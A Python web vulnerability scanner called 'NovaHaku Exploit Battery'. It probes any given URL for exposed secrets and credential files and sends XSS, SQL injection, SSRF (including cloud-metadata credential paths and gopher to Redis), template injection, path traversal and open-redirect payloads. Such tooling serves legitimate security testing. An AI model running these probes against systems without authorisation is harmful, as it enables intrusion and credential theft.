#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
webtest.py — NovaHaku Exploit Battery (stdlib-only)
Usage:
  python webtest.py <url> [--modules a,b,c] [--cookie "k=v"] [--jwt TOKEN]
                   [--proxy http://127.0.0.1:8080] [--timeout 10]
No-arg = help. Results saved to webtest_results.json next to this script.

Modules: headers,exposed,cors,methods,admin,xss,sqli,ssrf,ssti,traversal,redirect,info,dirfuzz,https
Default: all modules.
"""
import sys, os, json, re, ssl, base64, time
import urllib.request, urllib.parse, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
import io
if hasattr(sys.stdout, 'buffer') and sys.stdout.encoding != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "webtest_results.json")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 webtest-battery/1.0"

def make_opener(proxy=None, timeout=10):
    handlers = []
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    handlers.append(urllib.request.HTTPSHandler(context=ctx))
    return urllib.request.build_opener(*handlers), timeout

class T:
    def __init__(self, base, cookie=None, jwt=None, proxy=None, timeout=10):
        self.base = base.rstrip("/")
        self.cookie = cookie or ""
        self.jwt = jwt
        self.opener, self.timeout = make_opener(proxy, timeout)
        self.findings = []
        self.checked = 0

    def req(self, path, method="GET", data=None, headers=None, timeout=None):
        url = self.base + path
        h = {"User-Agent": UA, "Accept": "*/*"}
        if self.cookie:
            h["Cookie"] = self.cookie
        if self.jwt:
            h["Authorization"] = "Bearer " + self.jwt
        if headers:
            h.update(headers)
        if data is not None and isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        try:
            resp = self.opener.open(r, timeout=timeout or self.timeout)
            body = resp.read(200000)
            return resp.status, dict(resp.headers), body
        except urllib.error.HTTPError as e:
            try:
                return e.code, dict(e.headers), e.read(200000)
            except Exception:
                return e.code, {}, b""
        except Exception as e:
            return None, {}, str(e).encode()

    def add(self, module, sev, title, detail):
        self.findings.append({"module": module, "severity": sev, "title": title, "detail": detail})
        tag = {"CRIT": "[!!]", "HIGH": "[!!]", "MED": "[+]", "LOW": "[-]", "INFO": "[i]"}[sev]
        print(f"  {tag} {title}")

    def run(self, modules):
        for m in modules:
            fn = getattr(self, "mod_" + m, None)
            if not fn:
                print(f"  [x] unknown module: {m}")
                continue
            print(f"\n=== {m} ===")
            try:
                fn()
            except Exception as e:
                print(f"  [x] module {m} crashed: {e}")

    # ---------- modules ----------
    def mod_headers(self):
        st, hd, body = self.req("/")
        if st is None:
            print("  [x] no response"); return
        checks = {
            "Strict-Transport-Security": "HSTS missing",
            "Content-Security-Policy": "CSP missing",
            "X-Frame-Options": "X-Frame-Options missing (clickjacking)",
            "X-Content-Type-Options": "X-Content-Type-Options missing (MIME sniffing)",
            "Referrer-Policy": "Referrer-Policy missing",
            "Permissions-Policy": "Permissions-Policy missing",
        }
        for k, v in checks.items():
            if k not in hd:
                self.add("headers", "LOW", v, "")
            else:
                self.checked += 1
        server = hd.get("Server") or hd.get("X-Powered-By")
        if server:
            self.add("headers", "LOW", f"Server software exposed: {server}", "hide version info")

    def mod_exposed(self):
        paths = [
            "/.git/config", "/.git/HEAD", "/.env", "/.env.local", "/.env.production",
            "/.env.backup", "/backup.zip", "/backup.sql", "/db.sqlite3", "/database.sql",
            "/dump.sql", "/.bash_history", "/.DS_Store", "/web.config", "/.htaccess",
            "/config.php", "/config.js", "/package.json", "/composer.json",
            "/.aws/credentials", "/server.js", "/app.js", "/id_rsa", "/.ssh/id_rsa",
        ]
        for p in paths:
            st, hd, body = self.req(p)
            if st and st == 200:
                head = body[:200]
                if head.strip():  # non-empty body
                    self.add("exposed", "CRIT", f"{p} accessible (200)", head[:160].decode(errors="replace"))

    def mod_cors(self):
        st, hd, body = self.req("/", headers={"Origin": "https://evil.com"})
        if st is None:
            return
        acao = hd.get("Access-Control-Allow-Origin", "")
        acac = hd.get("Access-Control-Allow-Credentials", "")
        if acao == "*":
            self.add("cors", "HIGH", "CORS wildcard *", "any origin allowed")
        elif acao == "https://evil.com":
            sev = "HIGH" if acac.lower() == "true" else "MED"
            self.add("cors", sev, f"CORS reflects arbitrary origin: {acao}", f"credentials={acac}")

    def mod_methods(self):
        for m in ["OPTIONS", "TRACE", "PUT"]:
            st, hd, body = self.req("/", method=m)
            if st == 405 or st == 501:
                continue
            if st in (200, 204):
                if m == "TRACE":
                    self.add("methods", "HIGH", "TRACE enabled (XST possible)", "")
                elif m == "PUT":
                    self.add("methods", "HIGH", "PUT returns 200 — test file write", "try PUT /pwn.txt")
                else:
                    self.add("methods", "INFO", f"OPTIONS returns {st}", str(hd.get("Allow", "")))
            if m == "OPTIONS" and hd.get("Allow"):
                self.add("methods", "INFO", f"Allow: {hd['Allow']}", "")

    def mod_admin(self):
        paths = [
            "/admin", "/admin/", "/admin/login", "/administrator", "/wp-admin", "/wp-login.php",
            "/phpmyadmin", "/actuator", "/actuator/env", "/graphql", "/graphiql",
            "/api/docs", "/swagger", "/swagger-ui.html", "/api/swagger.json",
            "/debug", "/console", "/manager/html", "/.well-known/security.txt",
        ]
        for p in paths:
            st, hd, body = self.req(p)
            if st and st == 200:
                head = body[:150].decode(errors="replace")
                self.add("admin", "MED", f"admin/panel endpoint open: {p} (200)", head[:100])

    def mod_xss(self):
        payloads = [
            "<script>alert(1337)</script>",
            "<img src=x onerror=alert(1337)>",
            "<svg onload=alert(1337)>",
            "javascript:alert(1337)//",
            "'-alert(1337)-'",
            "\"><script>alert(1337)</script>",
            "<svg/onload=alert(1337)>",
            "<details open ontoggle=alert(1337)>",
            "<iframe srcdoc='<script>alert(1337)</script>'>",
            "<<script>alert(1337)//<</script>",
        ]
        params = ["q", "search", "query", "id", "page", "name", "url", "redirect", "keyword", "s", "callback", "cb"]
        jobs = [(p, pl) for pl in payloads for p in params]
        def _test(args):
            p, pl = args
            st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl))
            if st is None:
                return None
            txt = body.decode(errors="replace")
            if pl in txt or "alert(1337)" in txt:
                return (p, pl)
            return None
        with ThreadPoolExecutor(max_workers=10) as ex:
            futs = {ex.submit(_test, j): j for j in jobs}
            for f in as_completed(futs):
                r = f.result()
                if r:
                    self.add("xss", "HIGH", f"Reflected payload in param: {r[0]}", r[1])
                    break

    def mod_sqli(self):
        payloads = [
            "'", "' OR '1'='1", '" OR "1"="1', "1' AND SLEEP(0)--", "1);SELECT 1--",
            "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
            "1' AND (SELECT 1 FROM DUAL)--", "admin'--", "' OR 1=1-- -",
            "1 AND 1=1", "1 AND 1=2",
        ]
        sigs = [
            "sql syntax", "mysql_fetch", "mysqli", "postgresql", "sqlite3", "ORA-",
            "unclosed quotation", "syntax error", "pg_query", "Microsoft OLE DB",
            "SQLSTATE", "Warning: mysql", "in your SQL syntax",
            "MariaDB", "Invalid query", "query failed",
        ]
        params = ["id", "user", "page", "cat", "product", "item", "news_id", "article"]
        jobs = [(p, pl) for p in params for pl in payloads]
        def _test(args):
            p, pl = args
            st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl))
            if st is None:
                return None
            txt = body.decode(errors="replace").lower()
            for s in sigs:
                if s.lower() in txt:
                    return (p, pl, s)
            return None
        with ThreadPoolExecutor(max_workers=10) as ex:
            futs = {ex.submit(_test, j): j for j in jobs}
            for f in as_completed(futs):
                r = f.result()
                if r:
                    self.add("sqli", "HIGH", f"SQL error signature in param {r[0]}: {r[2]}", f"payload: {r[1]}")
                    break

    def mod_ssrf(self):
        # cloud metadata + internal probes (sent via URL param)
        probes = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.0.0.1:6379/",
            "http://127.0.0.1:3306/",
            "http://[::1]/",
            "http://0.0.0.0/",
            "http://2130706433/",  # decimal 127.0.0.1
            "http://0177.0.0.1/",  # octal
            "gopher://127.0.0.1:6379/_INFO",
        ]
        sigs = ["ami-id", "instance-id", "hostname", "security-credentials",
                "redis_version", "ERROR", "mysql", "ssh", "internal"]
        params = ["url", "target", "link", "uri", "path", "webhook", "callback", "img", "image"]
        jobs = [(p, pl) for p in params for pl in probes]
        def _test(args):
            p, pl = args
            st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl))
            if st is None:
                return None
            txt = body.decode(errors="replace")
            for s in sigs:
                if s.lower() in txt.lower():
                    return (p, pl, s)
            return None
        with ThreadPoolExecutor(max_workers=10) as ex:
            futs = {ex.submit(_test, j): j for j in jobs}
            for f in as_completed(futs):
                r = f.result()
                if r:
                    self.add("ssrf", "CRIT", f"SSRF reachable via param {r[0]}", f"payload: {r[1]} -> response contains {r[2]!r}")
                    break

    def mod_ssti(self):
        payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
        for p in ["q", "name", "search", "msg", "template"]:
            for pl in payloads:
                st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl))
                if st is None:
                    continue
                txt = body.decode(errors="replace")
                if "49" in txt:
                    self.add("ssti", "HIGH", f"SSTI candidate — 7*7=49 rendered in param {p}", pl)
                    return

    def mod_traversal(self):
        payloads = [
            "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd", "/etc/passwd",
        ]
        sigs = ["root:", "daemon:", "[fonts]", "for 16-bit app support"]
        for p in ["file", "page", "path", "include", "load", "doc", "download"]:
            for pl in payloads:
                st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl))
                if st is None:
                    continue
                txt = body.decode(errors="replace")
                for s in sigs:
                    if s in txt:
                        self.add("traversal", "CRIT", f"Path traversal in param {p}", f"payload: {pl}")
                        return

    def mod_redirect(self):
        payload = "https://evil.com"
        for p in ["url", "next", "return", "redirect", "goto", "redirect_uri"]:
            st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(payload))
            if st in (301, 302, 303, 307, 308):
                loc = hd.get("Location", "")
                if payload in loc:
                    self.add("redirect", "MED", f"Open redirect via param {p}", loc)

    def mod_info(self):
        st, hd, body = self.req("/")
        if st is None:
            return
        txt = body.decode(errors="replace")
        sigs = ["stack trace", "Traceback (most recent call last)", "at com\\.", "at org\\.",
                "node_modules", "webpack://", "sourceMappingURL", "DEBUG = True", "SQLException",
                "NullPointerException", "Undefined index"]
        for s in sigs:
            if re.search(s, txt, re.I):
                self.add("info", "HIGH", f"Info disclosure: {s}", "")
                return

    def mod_dirfuzz(self):
        words = ["api", "v1", "v2", "assets", "static", "uploads", "files", "img", "images",
                 "css", "js", "login", "register", "signup", "logout", "profile", "user",
                 "users", "settings", "dashboard", "config", "test", "dev", "staging",
                 "old", "backup", "tmp", "data", "export", "admin.php", "admin.jsp", "robots.txt", "sitemap.xml"]
        found = []
        with ThreadPoolExecutor(max_workers=10) as ex:
            futs = {ex.submit(self.req, "/" + w): w for w in words}
            for f in as_completed(futs):
                w = futs[f]
                st, hd, body = f.result()
                if st and st == 200:
                    found.append(w)
        for w in sorted(found):
            self.add("dirfuzz", "INFO", f"dir exists: /{w}", "")

    def mod_https(self):
        if not self.base.startswith("http://"):
            return
        https_url = self.base.replace("http://", "https://", 1)
        try:
            st, hd, body = self.req("/")
            if st and st in (301, 302, 303, 307, 308):
                loc = hd.get("Location", "")
                if loc.startswith("https"):
                    self.checked += 1
                    return
            self.add("https", "LOW", "No forced HTTP→HTTPS redirect", "")
        except Exception:
            self.add("https", "LOW", "HTTPS not responding", "")

def main():
    args = sys.argv[1:]
    if not args or args[0] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)
    url = args[0]
    opts = {}
    i = 1
    while i < len(args):
        if args[i] == "--modules":
            opts["modules"] = args[i + 1].split(","); i += 2
        elif args[i] == "--cookie":
            opts["cookie"] = args[i + 1]; i += 2
        elif args[i] == "--jwt":
            opts["jwt"] = args[i + 1]; i += 2
        elif args[i] == "--proxy":
            opts["proxy"] = args[i + 1]; i += 2
        elif args[i] == "--timeout":
            opts["timeout"] = int(args[i + 1]); i += 2
        else:
            i += 1
    if not url.startswith("http"):
        url = "https://" + url
    print(f"[*] target: {url}")
    t = T(url, cookie=opts.get("cookie"), jwt=opts.get("jwt"),
          proxy=opts.get("proxy"), timeout=opts.get("timeout", 10))
    modules = opts.get("modules", [
        "headers", "exposed", "cors", "methods", "admin", "xss", "sqli", "ssrf",
        "ssti", "traversal", "redirect", "info", "dirfuzz", "https",
    ])
    t.run(modules)
    with open(OUT, "w") as f:
        json.dump({"target": url, "findings": t.findings}, f, indent=2)
    print(f"\n[*] done — {len(t.findings)} findings -> {OUT}")
    if t.findings:
        print("[*] verify each [!!] manually — 200 OK is not proof of exploit")

if __name__ == "__main__":
    main()
